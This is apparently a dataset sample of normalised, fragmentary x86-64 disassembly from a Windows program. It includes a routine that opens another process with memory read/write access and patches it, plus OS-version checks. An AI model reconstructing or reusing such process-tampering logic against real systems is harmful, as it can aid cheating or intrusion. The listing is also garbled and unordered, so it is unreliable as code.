mov rax [ rbx ]
movsxd rcx [ rax + 0x4 ]
mov rcx [ rcx + rbx + 0x48 ]
mov rdx [ rcx + 0x40 ]
cmp [ rdx ] 0x0
je r-xdata
xor edx edx
lea rcx [ rsp + 0x60 ]
call sub_14003825c
mov rax [ rsi + 0x8 ]
test rax rax
je r-xdata
mov rax [ rcx ]
call [ rax + 0x30 ]
movzx r8d ax
mov rax [ rcx + 0x58 ]
cmp [ rax ] 0x0
jle r-xdata
xor edi edi
cmp [ rsi + 0x8 ] rdi
cmove rdi rsi
lea rcx [ rsp + 0x60 ]
call sub_14003828c
test rdi rdi
je r-xdata
cmp rax 0xffffffffffffffff
jae r-xdata
mov rax [ r12 ]
mov edx 0x48
mov rcx r12
call [ rax + 0x10 ]
test al al
jne r-xdata
mov rax [ rbx ]
movsxd rcx [ rax + 0x4 ]
add rcx rbx
mov edx [ rcx + 0x10 ]
or edx 0x1
cmp [ rcx + 0x48 ] 0x0
jne r-xdata
mov rax [ rdx ]
movzx r8d [ rax ]
jmp r-xdata
mov rax [ rdi ]
mov edx 0x1
mov rcx rdi
call [ rax ]
nop
dec rax
mov [ rsi + 0x8 ] rax
mov rax [ rbx ]
movsxd rcx [ rax + 0x4 ]
mov rcx [ rcx + rbx + 0x48 ]
call sub_140006d70
movzx r8d ax
jmp r-xdata
jmp r-xdata
xor r8d r8d
call sub_140003120
jmp r-xdata
or edx 0x4
mov edi 0xffff
cmp di r8w
jne r-xdata
sub_1400070d0
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rbp
push rdi
sub rsp 0x20
mov rbx [ rcx ]
xor ebp ebp
mov rdi rcx
test rbx rbx
je r-xdata
mov rbx [ rsp + 0x38 ]
mov [ rdi ] rbp
mov [ rdi + 0x8 ] rbp
mov [ rdi + 0x10 ] rbp
mov rbp [ rsp + 0x40 ]
add rsp 0x20
pop rdi
retn
mov [ rsp + 0x30 ] rsi
mov rsi [ rcx + 0x8 ]
cmp rbx rsi
je r-xdata
mov rcx [ rdi ]
call j_sub_14003ad04
mov rsi [ rsp + 0x30 ]
nop [ rax + rax ] ax
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] rbp
mov [ rbx ] bp
add rbx 0x28
cmp rbx rsi
jne r-xdata
mov rcx [ rbx ]
call j_sub_14003ad04
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
sub_140007150
push rdi
sub rsp 0x20
mov rdi rcx
mov rcx [ rcx + 0x8 ]
mov r8 [ rdi ]
cmp r8 rcx
je r-xdata
add rsp 0x20
pop rdi
retn
mov [ rsp + 0x30 ] rbx
mov rdx rcx
mov [ rsp + 0x38 ] rbp
mov [ rsp + 0x40 ] rsi
call sub_140007720
mov rsi [ rdi + 0x8 ]
mov rbp rax
mov rbx rax
cmp rax rsi
je r-xdata
mov rsi [ rsp + 0x40 ]
mov rbx [ rsp + 0x30 ]
mov [ rdi + 0x8 ] rbp
mov rbp [ rsp + 0x38 ]
mov [ rsp + 0x48 ] r12
xor r12d r12d
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] r12
mov [ rbx ] r12w
add rbx 0x28
cmp rbx rsi
jne r-xdata
mov rcx [ rbx ]
call j_sub_14003ad04
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
mov r12 [ rsp + 0x48 ]
sub_1400071e0
mov [ rsp + 0x10 ] rbx
push rdi
sub rsp 0x20
mov rax r8
mov r10 rdx
mov rbx rcx
xor edi edi
or r9 0xffffffffffffffff
xor r8d r8d
mov rdx rax
mov rcx r10
mov [ rsp + 0x30 ] edi
call sub_140007240
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] rdi
mov rcx rbx
mov rdx rax
mov [ rbx ] di
call sub_1400027f0
mov rax rbx
mov rbx [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
sub_140007240
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rsi
mov [ rsp + 0x20 ] rdi
push r12
sub rsp 0x20
mov rax [ rdx + 0x10 ]
mov rsi r9
mov r12 r8
mov rdi rdx
mov rbx rcx
cmp rax r8
jae r-xdata
mov rcx [ rcx + 0x10 ]
sub rax r8
cmp rax r9
cmovb rsi rax
or rax 0xffffffffffffffff
sub rax rcx
cmp rax rsi
ja r-xdata
lea rcx [ r--data ]
call sub_140037948
test rsi rsi
je r-xdata
lea rcx [ r--data ]
call sub_1400378ec
mov rsi [ rsp + 0x40 ]
mov rdi [ rsp + 0x48 ]
mov rax rbx
mov rbx [ rsp + 0x38 ]
add rsp 0x20
pop r12
retn
mov [ rsp + 0x30 ] rbp
lea rbp [ rcx + rsi ]
mov rcx rbx
mov rdx rbp
call sub_140002230
test al al
je r-xdata
mov rbp [ rsp + 0x30 ]
cmp [ rdi + 0x18 ] 0x8
jb r-xdata
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
mov rdi [ rdi ]
mov rcx rbx
mov rcx [ rbx ]
jmp r-xdata
mov rax rbx
mov rax [ rbx ]
jmp r-xdata
mov rax [ rbx + 0x10 ]
lea r8 [ rsi + rsi ]
lea rdx [ rdi + r12 * 2 ]
lea rcx [ rcx + rax * 2 ]
call sub_14003a8c0
cmp [ rbx + 0x18 ] 0x8
mov [ rbx + 0x10 ] rbp
jb r-xdata
xor ecx ecx
mov [ rax + rbp * 2 ] cx
sub_140007320
mov [ rsp + 0x8 ] rcx
push rbx
push rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x50
mov [ rsp + 0x38 ] 0xfffffffffffffffe
mov r14 rdx
mov rdi rcx
xor ebx ebx
mov [ rsp + 0xa8 ] ebx
xor r13b r13b
mov [ rsp + 0xa0 ] r13b
mov r15 rcx
mov [ rsp + 0x40 ] rcx
mov rax [ rcx ]
movsxd r8 [ rax + 0x4 ]
mov rcx [ r8 + rcx + 0x48 ]
test rcx rcx
je r-xdata
xor edx edx
mov rcx rdi
call sub_140006f30
mov [ rsp + 0x48 ] al
test al al
je r-xdata
mov rax [ rcx ]
call [ rax + 0x8 ]
nop
mov rax [ rdi ]
movsxd rcx [ rax + 0x4 ]
mov [ rcx + rdi + 0x28 ] 0x0
test r13b r13b
jne r-xdata
mov rax [ rdi ]
movsxd rcx [ rax + 0x4 ]
add rcx rdi
lea rdx [ rsp + 0x28 ]
call sub_140003240
nop
mov rcx rax
call sub_140004d80
mov [ rsp + 0x30 ] rax
mov r12 [ rsp + 0x28 ]
test r12 r12
je r-xdata
mov rax [ rdi ]
movsxd rcx [ rax + 0x4 ]
add rcx rdi
test ebx ebx
je r-xdata
or ebx 0x2
or r8 0xffffffffffffffff
xor edx edx
mov rcx r14
call sub_140002190
nop
mov rax [ rdi ]
movsxd rcx [ rax + 0x4 ]
mov r12 [ rcx + rdi + 0x28 ]
mov rax 0x7ffffffffffffffe
test r12 r12
jle r-xdata
xor edx edx
lea rcx [ rsp + 0x20 ]
call sub_14003825c
mov rax [ r12 + 0x8 ]
test rax rax
je r-xdata
mov rax [ r15 ]
movsxd rcx [ rax + 0x4 ]
mov rcx [ rcx + r15 + 0x48 ]
test rcx rcx
je r-xdata
mov edx [ rcx + 0x10 ]
or edx ebx
cmp [ rcx + 0x48 ] 0x0
jne r-xdata
mov r12 rax
cmp r12 rax
jb r-xdata
xor esi esi
cmp [ r12 + 0x8 ] rsi
cmove rsi r12
lea rcx [ rsp + 0x20 ]
call sub_14003828c
test rsi rsi
je r-xdata
cmp rax 0xffffffffffffffff
jae r-xdata
mov rax rdi
add rsp 0x50
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbx
retn
mov rax [ rcx ]
call [ rax + 0x10 ]
xor r8d r8d
call sub_140003120
nop
or edx 0x4
mov rax [ rcx ]
call [ rax + 0x30 ]
movzx esi ax
mov rax [ rcx + 0x58 ]
cmp [ rax ] 0x0
jle r-xdata
mov rcx [ rcx + rdi + 0x48 ]
mov rdx [ rcx + 0x40 ]
cmp [ rdx ] 0x0
je r-xdata
mov rax [ rsi ]
mov edx 0x1
mov rcx rsi
call [ rax ]
dec rax
mov [ r12 + 0x8 ] rax
jmp r-xdata
cmp ax si
jne r-xdata
mov rax [ rdx ]
movzx esi [ rax ]
jmp r-xdata
mov rcx [ rsp + 0x30 ]
mov rax [ rcx ]
mov edx 0x48
movzx r8d si
call [ rax + 0x10 ]
test al al
jne r-xdata
or ebx 0x1
mov [ rsp + 0xa8 ] ebx
jmp r-xdata
mov eax 0xffff
test r12 r12
je r-xdata
movzx edx si
mov rcx r14
call sub_1400077e0
mov r13b 0x1
mov [ rsp + 0xa0 ] r13b
dec r12
mov rax [ rdi ]
movsxd rcx [ rax + 0x4 ]
mov rcx [ rcx + rdi + 0x48 ]
call sub_140006d70
movzx esi ax
jmp r-xdata
sub_140007550
mov rax rsp
mov [ rax + 0x8 ] rcx
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x40
mov [ rsp + 0x28 ] 0xfffffffffffffffe
mov [ rax + 0x10 ] rbx
mov [ rax + 0x18 ] rsi
movzx r13d r8w
mov r12 rdx
mov rdi rcx
xor ebx ebx
mov [ rsp + 0x20 ] ebx
xor sil sil
mov [ rsp + 0x88 ] sil
mov r14 rcx
mov [ rax - 0x38 ] rcx
mov rax [ rcx ]
movsxd r9 [ rax + 0x4 ]
mov rcx [ r9 + rcx + 0x48 ]
test rcx rcx
je r-xdata
mov dl 0x1
mov rcx rdi
call sub_140006f30
mov [ rsp + 0x38 ] al
test al al
je r-xdata
mov rax [ rcx ]
call [ rax + 0x8 ]
nop
or ebx 0x2
or r8 0xffffffffffffffff
xor edx edx
mov rcx r12
call sub_140002190
mov rax [ rdi ]
movsxd rcx [ rax + 0x4 ]
mov rcx [ rcx + rdi + 0x48 ]
mov rdx [ rcx + 0x40 ]
cmp [ rdx ] 0x0
je r-xdata
mov rax [ r14 ]
movsxd rcx [ rax + 0x4 ]
mov rcx [ rcx + r14 + 0x48 ]
test rcx rcx
je r-xdata
mov edx [ rcx + 0x10 ]
or edx ebx
cmp [ rcx + 0x48 ] 0x0
jne r-xdata
mov rax [ rcx ]
call [ rax + 0x30 ]
mov rax [ rcx + 0x58 ]
cmp [ rax ] 0x0
jle r-xdata
mov rax rdi
mov rbx [ rsp + 0x78 ]
mov rsi [ rsp + 0x80 ]
add rsp 0x40
pop r15
pop r14
pop r13
pop r12
pop rdi
retn
mov rax [ rcx ]
call [ rax + 0x10 ]
xor r8d r8d
call sub_140003120
nop
or edx 0x4
cmp ax r13w
jne r-xdata
or ebx 0x1
jmp r-xdata
mov rax [ rdx ]
movzx eax [ rax ]
jmp r-xdata
cmp [ r12 + 0x10 ] rcx
jb r-xdata
mov sil 0x1
mov [ rsp + 0x88 ] sil
mov rax [ rdi ]
movsxd rcx [ rax + 0x4 ]
mov rcx [ rcx + rdi + 0x48 ]
mov rax [ rcx + 0x40 ]
cmp [ rax ] 0x0
je r-xdata
mov [ rsp + 0x20 ] ebx
mov r15d 0xffff
movzx edx ax
mov rcx r12
call sub_1400077e0
mov sil 0x1
mov [ rsp + 0x88 ] sil
mov rax [ rdi ]
movsxd rcx [ rax + 0x4 ]
mov rcx [ rcx + rdi + 0x48 ]
call sub_140006d70
jmp r-xdata
or ebx 0x2
mov rax [ rcx ]
call [ rax + 0x38 ]
jmp r-xdata
mov rax [ rcx + 0x58 ]
cmp [ rax ] 0x0
jle r-xdata
test sil sil
jne r-xdata
mov rcx 0x7ffffffffffffffe
cmp r15w ax
jne r-xdata
jmp r-xdata
dec [ rax ]
mov rax [ rcx + 0x40 ]
add [ rax ] 0x2
jmp r-xdata
mov rax [ rdi ]
movsxd rcx [ rax + 0x4 ]
add rcx rdi
test ebx ebx
je r-xdata
sub_140007720
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x20
mov rbx r8
mov rsi rdx
mov rdi rcx
cmp rcx rdx
je r-xdata
mov rsi [ rsp + 0x40 ]
mov rax rbx
mov rbx [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
mov [ rsp + 0x30 ] rbp
xor ebp ebp
add rdi 0x28
add rbx 0x28
cmp rdi rsi
jne r-xdata
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
cmp rbx rdi
je r-xdata
mov rbp [ rsp + 0x30 ]
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] rbp
mov [ rbx ] bp
cmp [ rdi + 0x18 ] 0x8
jae r-xdata
mov rcx [ rbx ]
call j_sub_14003ad04
mov rax [ rdi ]
mov [ rbx ] rax
mov [ rdi ] rbp
mov r8 [ rdi + 0x10 ]
mov rdx rdi
mov rcx rbx
lea r8 [ r8 + r8 + 0x2 ]
call sub_14003a8c0
jmp r-xdata
mov rax [ rdi + 0x10 ]
mov [ rbx + 0x10 ] rax
mov rax [ rdi + 0x18 ]
mov [ rbx + 0x18 ] rax
mov [ rdi + 0x18 ] 0x7
mov [ rdi + 0x10 ] rbp
mov [ rdi ] bp
sub_1400077e0
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
mov rdi [ rcx + 0x10 ]
or rax 0xffffffffffffffff
movzx esi dx
sub rax rdi
mov rbx rcx
cmp rax 0x1
ja r-xdata
inc rdi
mov rdx rdi
call sub_140002230
test al al
je r-xdata
lea rcx [ r--data ]
call sub_1400378ec
mov rsi [ rsp + 0x38 ]
mov rax rbx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
cmp [ rbx + 0x18 ] 0x8
mov rcx [ rbx + 0x10 ]
jb r-xdata
mov rax rbx
mov rax [ rbx ]
jmp r-xdata
mov rax rbx
mov rax [ rbx ]
jmp r-xdata
mov [ rax + rcx * 2 ] si
cmp [ rbx + 0x18 ] 0x8
mov [ rbx + 0x10 ] rdi
jb r-xdata
xor ecx ecx
mov [ rax + rdi * 2 ] cx
sub_140007870
mov [ rsp + 0x10 ] rbx
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x30
mov rbp rcx
xor r15d r15d
or r14 0xffffffffffffffff
xor eax eax
mov rcx r14
mov rdi rbp
[ rdi ]
mov r12 rdx
mov [ rsp + 0x80 ] r15d
not rcx
mov edi r15d
mov rsi rbp
lea r13 [ rcx - 0x1 ]
inc r13
mov rbx r13
je r-xdata
inc rdi
mov eax 0x2
mul rdi
cmovo rax r14
mov rcx rax
call j_sub_14003ac60
mov [ rsp + 0x88 ] r15d
mov rsi rax
mov rbx rax
test rdi rdi
je r-xdata
nop [ rax + rax ] eax
mov [ rbx ] r15w
mov rbx [ rsp + 0x78 ]
mov rax rsi
add rsp 0x30
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
nop [ rax + rax ] eax
cdqe
inc rdi
add rsi rax
sub rbx rax
jne r-xdata
cdqe
add rbx 0x2
add rbp rax
dec rdi
jne r-xdata
lea r9 [ rsp + 0x80 ]
lea rcx [ rsp + 0x70 ]
mov r8 rbx
mov rdx rsi
mov [ rsp + 0x20 ] r12
call sub_1400385a4
test eax eax
jle r-xdata
lea r9 [ rsp + 0x88 ]
mov r8 r13
mov rdx rbp
mov rcx rbx
mov [ rsp + 0x20 ] r12
call sub_1400385a4
test eax eax
jle r-xdata
sub_140007970
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov edx 0xa
mov rbx rcx
call sub_1400085e0
mov rax [ rbx ]
xor edi edi
movsxd rcx [ rax + 0x4 ]
test [ rcx + rbx + 0x10 ] 0x6
jne r-xdata
mov rax [ rbx ]
movsxd rcx [ rax + 0x4 ]
add rcx rbx
test edi edi
je r-xdata
mov rcx [ rcx + rbx + 0x48 ]
mov rax [ rcx ]
call [ rax + 0x68 ]
mov ecx 0x4
cmp eax 0xffffffff
cmove edi ecx
mov rax rbx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov edx [ rcx + 0x10 ]
or edx edi
cmp [ rcx + 0x48 ] 0x0
jne r-xdata
xor r8d r8d
call sub_140003120
or edx 0x4
sub_1400079e0
push rbp
push rbx
push rsi
push rdi
push r12
push r13
push r14
lea rbp [ rsp - 0x10 ]
sub rsp 0x110
mov [ rsp + 0x40 ] 0xfffffffffffffffe
mov rax [ rw-data ]
xor rax rsp
mov [ rbp ] rax
mov r13 r9
mov rbx r8
mov rsi rdx
mov rdi rcx
mov [ rsp + 0x50 ] rcx
mov [ rsp + 0x48 ] rdx
xor r12b r12b
mov [ rbp - 0x68 ] 0x7
xor r14d r14d
mov [ rbp - 0x70 ] r14
mov [ rbp - 0x80 ] r14w
mov [ rbp - 0x40 ] 0x7
mov [ rbp - 0x48 ] r14
mov [ rbp - 0x58 ] r14w
mov rdx rcx
lea rcx [ rbp - 0x80 ]
call sub_14000eb30
test al al
je r-xdata
xor r8d r8d
mov dl 0x1
lea rcx [ rsp + 0x58 ]
call sub_14000f390
mov rbx rax
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_14000ac10
mov rcx rax
mov rdx rdi
call sub_14000ae70
mov rcx rax
lea rdx [ r--data ]
call sub_14000ac10
mov rcx rax
mov rdx rbx
call sub_14000ae70
mov rcx rax
call sub_140007970
nop
cmp [ rsp + 0x70 ] 0x8
jb r-xdata
mov eax [ rbp - 0x2c ]
cmp eax 0x1
je r-xdata
cmp [ rbp - 0x40 ] 0x8
jb r-xdata
mov rcx [ rsp + 0x58 ]
call j_sub_14003ad04
nop
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_14000ac10
mov rcx rax
mov rdx rdi
call sub_14000ae70
mov rcx rax
lea rdx [ r--data ]
call sub_14000ac10
mov rcx rax
lea rdx [ rbp - 0x58 ]
call sub_14000ae70
mov rcx rax
lea rdx [ r--data ]
call sub_14000ac10
mov rcx rax
call sub_140007970
jmp r-xdata
cmp eax 0x3
je r-xdata
mov [ rbp - 0x40 ] 0x7
mov [ rbp - 0x48 ] r14
mov [ rbp - 0x58 ] r14w
cmp [ rbp - 0x68 ] 0x8
jb r-xdata
mov rcx [ rbp - 0x58 ]
call j_sub_14003ad04
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_14000ac10
mov rcx rax
lea rdx [ rbp - 0x58 ]
call sub_14000ae70
mov rcx rax
call sub_140007970
mov [ rsp + 0x70 ] 0x7
mov [ rsp + 0x68 ] r14
mov [ rsp + 0x58 ] r14w
or r9 0xffffffffffffffff
xor r8d r8d
mov rdx rsi
lea rcx [ rsp + 0x58 ]
call sub_140001dd0
mov r11d [ rbp + 0x80 ]
mov [ rsp + 0x30 ] r11d
mov rax [ rbp + 0x78 ]
mov [ rsp + 0x28 ] rax
mov rax [ rbp + 0x70 ]
mov [ rsp + 0x20 ] rax
mov r9 r13
mov r8 rbx
lea rdx [ rsp + 0x58 ]
mov ecx [ rbp - 0x14 ]
call sub_140007c60
movzx r12d al
jmp r-xdata
mov [ rbp - 0x68 ] 0x7
mov [ rbp - 0x70 ] r14
mov [ rbp - 0x80 ] r14w
cmp [ rdi + 0x18 ] 0x8
jb r-xdata
mov rcx [ rbp - 0x80 ]
call j_sub_14003ad04
mov [ rdi + 0x18 ] 0x7
mov [ rdi + 0x10 ] r14
mov [ rdi ] r14w
cmp [ rsi + 0x18 ] 0x8
jb r-xdata
mov rcx [ rdi ]
call j_sub_14003ad04
mov [ rsi + 0x18 ] 0x7
mov [ rsi + 0x10 ] r14
mov [ rsi ] r14w
movzx eax r12b
mov rcx [ rbp ]
xor rcx rsp
call sub_14003a6a0
add rsp 0x110
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbx
pop rbp
retn
mov rcx [ rsi ]
call j_sub_14003ad04
sub_140007c60
push rbp
push rbx
push rsi
push rdi
push r13
push r14
push r15
lea rbp [ rsp - 0x20 ]
sub rsp 0x120
mov [ rsp + 0x50 ] 0xfffffffffffffffe
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x10 ] rax
mov [ rsp + 0x48 ] r9
mov r15 r8
mov rdi rdx
mov [ rsp + 0x30 ] ecx
mov [ rbp - 0x20 ] rdx
mov rax [ rbp + 0x80 ]
mov [ rsp + 0x40 ] rax
mov eax [ rbp + 0x90 ]
mov [ rsp + 0x34 ] eax
xor r13b r13b
mov [ rbp - 0x58 ] 0x7
xor esi esi
mov [ rbp - 0x60 ] rsi
mov [ rbp - 0x70 ] si
mov [ rbp - 0x30 ] 0x7
mov [ rbp - 0x38 ] rsi
mov [ rbp - 0x48 ] si
cmp [ rdx + 0x10 ] rsi
sete al
test al al
cmovne rdx rsi
lea r8 [ rsp + 0x30 ]
lea rcx [ rsp + 0x60 ]
call sub_14000c3b0
test al al
je r-xdata
xor r8d r8d
mov dl 0x1
lea rcx [ rbp - 0x18 ]
call sub_14000f390
mov rbx rax
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_14000ac10
mov rcx rax
mov rdx rbx
call sub_14000ae70
mov rcx rax
call sub_140007970
nop
cmp [ rbp ] 0x8
jb r-xdata
mov rbx [ rsp + 0x78 ]
mov r14d [ rbp - 0x80 ]
mov r8d [ rsp + 0x30 ]
xor edx edx
lea ecx [ rsi + 0x38 ]
call [ OpenProcess@IAT ]
mov rsi rax
test rax rax
je r-xdata
cmp [ rbp - 0x30 ] 0x8
jb r-xdata
mov rcx [ rbp - 0x18 ]
call j_sub_14003ad04
jmp r-xdata
xor r8d r8d
mov dl 0x1
lea rcx [ rbp - 0x18 ]
call sub_14000f390
mov rbx rax
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_14000ac10
mov rcx rax
mov rdx rbx
call sub_14000ae70
mov rcx rax
call sub_140007970
nop
cmp [ rbp ] 0x8
jb r-xdata
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_14000ac10
mov rcx rax
mov rdx rdi
call sub_14000ae70
mov rcx rax
lea rdx [ r--data ]
call sub_14000ac10
mov rcx rax
mov edx [ rsp + 0x30 ]
call sub_140008400
mov rcx rax
lea rdx [ r--data ]
call sub_14000ac10
mov rcx rax
call sub_140007970
mov [ rsp + 0x38 ] 0x0
lea rdx [ rbx + r14 ]
mov [ rsp + 0x28 ] rsi
mov rax [ rsp + 0x48 ]
mov [ rsp + 0x20 ] rax
lea r9 [ rsp + 0x38 ]
mov r8 r15
mov rcx rbx
call sub_1400069a0
test al al
je r-xdata
mov [ rbp - 0x30 ] 0x7
mov [ rbp - 0x38 ] rsi
mov [ rbp - 0x48 ] si
cmp [ rbp - 0x58 ] 0x8
jb r-xdata
mov rcx [ rbp - 0x48 ]
call j_sub_14003ad04
xor esi esi
mov rcx [ rbp - 0x18 ]
call j_sub_14003ad04
jmp r-xdata
xor r8d r8d
mov dl 0x1
lea rcx [ rbp - 0x18 ]
call sub_14000f390
mov rbx rax
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_14000ac10
mov rcx rax
mov rdx rbx
call sub_14000ae70
mov rcx rax
call sub_140007970
nop
cmp [ rbp ] 0x8
jb r-xdata
movsxd rcx [ rsp + 0x34 ]
add rcx [ rsp + 0x38 ]
mov r9 rsi
mov r8 [ rbp + 0x88 ]
mov rdx [ rsp + 0x40 ]
call sub_140006890
movzx r13d al
lea rax [ r--data ]
lea rbx [ r--data ]
test r13b r13b
cmovne rbx rax
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_14000ac10
mov rcx rax
mov rdx rdi
call sub_14000ae70
mov rcx rax
lea rdx [ r--data ]
call sub_14000ac10
mov rcx rax
mov edx [ rsp + 0x30 ]
call sub_140008400
mov rcx rax
lea rdx [ r--data ]
call sub_14000ac10
mov rcx rax
mov rdx rbx
call sub_14000ac10
mov rcx rax
call sub_140007970
jmp r-xdata
mov [ rbp - 0x58 ] 0x7
mov [ rbp - 0x60 ] rsi
mov [ rbp - 0x70 ] si
cmp [ rdi + 0x18 ] 0x8
jb r-xdata
mov rcx [ rbp - 0x70 ]
call j_sub_14003ad04
mov rcx rsi
call [ CloseHandle@IAT ]
jmp r-xdata
mov rcx [ rbp - 0x18 ]
call j_sub_14003ad04
mov [ rdi + 0x18 ] 0x7
mov [ rdi + 0x10 ] rsi
mov [ rdi ] si
movzx eax r13b
mov rcx [ rbp + 0x10 ]
xor rcx rsp
call sub_14003a6a0
add rsp 0x120
pop r15
pop r14
pop r13
pop rdi
pop rsi
pop rbx
pop rbp
retn
mov rcx [ rdi ]
call j_sub_14003ad04
sub_140007fb0
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
cmp [ rcx + 0x70 ] 0x8
mov rbx rcx
jb r-xdata
xor edi edi
mov [ rbx + 0x70 ] 0x7
mov [ rbx + 0x68 ] rdi
mov [ rbx + 0x58 ] di
cmp [ rbx + 0x48 ] 0x8
jb r-xdata
mov rcx [ rcx + 0x58 ]
call j_sub_14003ad04
mov [ rbx + 0x48 ] 0x7
mov [ rbx + 0x40 ] rdi
mov [ rbx + 0x30 ] di
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rcx [ rbx + 0x30 ]
call j_sub_14003ad04
sub_140008010
mov rax rsp
push r12
sub rsp 0x190
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x180 ] rax
mov rdi rcx
xor edx edx
mov r8d 0x11c
lea rcx [ rsp + 0x60 ]
call sub_14003d760
mov [ rsp + 0x60 ] 0x11c
lea rcx [ rsp + 0x60 ]
call [ GetVersionExW@IAT ]
test eax eax
setne al
test al al
je r-xdata
xor r8d r8d
mov dl 0x1
lea rcx [ rsp + 0x28 ]
call sub_14000f390
mov rbx rax
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_14000ac10
mov rcx rax
mov rdx rbx
call sub_14000ae70
mov rcx rax
call sub_140007970
nop
cmp [ rsp + 0x40 ] 0x8
jb r-xdata
mov ebx [ rsp + 0x64 ]
mov ebp [ rsp + 0x68 ]
mov r12d [ rsp + 0x6c ]
cmp [ rsp + 0x17a ] 0x1
setne sil
lea rcx [ rsp + 0x28 ]
call [ GetNativeSystemInfo@IAT ]
cmp [ rsp + 0x28 ] 0x9
sete cl
cmp [ rdi ] ebx
jne r-xdata
xor al al
mov rcx [ rsp + 0x28 ]
call j_sub_14003ad04
cmp [ rdi + 0x4 ] ebp
jne r-xdata
mov eax [ rdi + 0x8 ]
cmp eax r12d
je r-xdata
cmp [ rdi + 0xc ] sil
jne r-xdata
test eax eax
jne r-xdata
cmp [ rdi + 0xd ] cl
jne r-xdata
mov al 0x1
jmp r-xdata
mov rcx [ rsp + 0x180 ]
xor rcx rsp
call sub_14003a6a0
lea r11 [ rsp + 0x190 ]
mov rbx [ r11 + 0x10 ]
mov rbp [ r11 + 0x18 ]
mov rsi [ r11 + 0x20 ]
mov rdi [ r11 + 0x28 ]
mov rsp r11
pop r12
retn
sub_140008150
push rbp
mov rbp rsp
sub rsp 0x30
cmp ecx 0xc
ja r-xdata
lea rcx [ rbp - 0x10 ]
call sub_140008010
add rsp 0x30
pop rbp
retn
lea rdx [ __dos_header ]
movsxd rax ecx
mov ecx [ rdx + rax * 4 + 0x82f4 ]
add rcx rdx
jmp rcx
xor eax eax
lea rcx [ rbp - 0x10 ]
mov [ rbp - 0x10 ] 0x5
mov [ rbp - 0x8 ] eax
mov [ rbp - 0x4 ] ax
call sub_140008010
add rsp 0x30
pop rbp
retn
xor eax eax
lea rcx [ rbp - 0x10 ]
mov [ rbp - 0x10 ] 0x5
mov [ rbp - 0x8 ] eax
mov [ rbp - 0x4 ] 0x1
call sub_140008010
add rsp 0x30
pop rbp
retn
mov [ rbp - 0x10 ] 0x5
mov [ rbp - 0x4 ] 0x0
jmp r-xdata
lea rcx [ rbp - 0x10 ]
mov [ rbp - 0x10 ] 0x5
mov [ rbp - 0xc ] 0x2
mov [ rbp - 0x4 ] 0x100
call sub_140008010
add rsp 0x30
pop rbp
retn
lea rcx [ rbp - 0x10 ]
mov [ rbp - 0x10 ] 0x5
mov [ rbp - 0xc ] 0x2
mov [ rbp - 0x4 ] 0x1
call sub_140008010
add rsp 0x30
pop rbp
retn
lea rcx [ rbp - 0x10 ]
mov [ rbp - 0x10 ] 0x5
mov [ rbp - 0xc ] 0x2
mov [ rbp - 0x4 ] 0x101
call sub_140008010
add rsp 0x30
pop rbp
retn
xor eax eax
lea rcx [ rbp - 0x10 ]
mov [ rbp - 0x10 ] 0x6
mov [ rbp - 0x8 ] eax
mov [ rbp - 0x4 ] ax
call sub_140008010
add rsp 0x30
pop rbp
retn
xor eax eax
lea rcx [ rbp - 0x10 ]
mov [ rbp - 0x10 ] 0x6
mov [ rbp - 0x8 ] eax
mov [ rbp - 0x4 ] 0x100
call sub_140008010
add rsp 0x30
pop rbp
retn
xor eax eax
lea rcx [ rbp - 0x10 ]
mov [ rbp - 0x10 ] 0x6
mov [ rbp - 0x8 ] eax
mov [ rbp - 0x4 ] 0x1
call sub_140008010
add rsp 0x30
pop rbp
retn
xor eax eax
lea rcx [ rbp - 0x10 ]
mov [ rbp - 0x10 ] 0x6
mov [ rbp - 0x8 ] eax
mov [ rbp - 0x4 ] 0x101
call sub_140008010
add rsp 0x30
pop rbp
retn
mov [ rbp - 0x4 ] 0x0
jmp r-xdata
mov [ rbp - 0x4 ] 0x100
jmp r-xdata
mov [ rbp - 0x4 ] 0x101
mov [ rbp - 0xc ] 0x1
mov [ rbp - 0x10 ] 0x6
sub_140008330
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
mov rbx [ rcx ]
xor dil dil
mov rsi rcx
cmp rbx [ rcx + 0x8 ]
je r-xdata
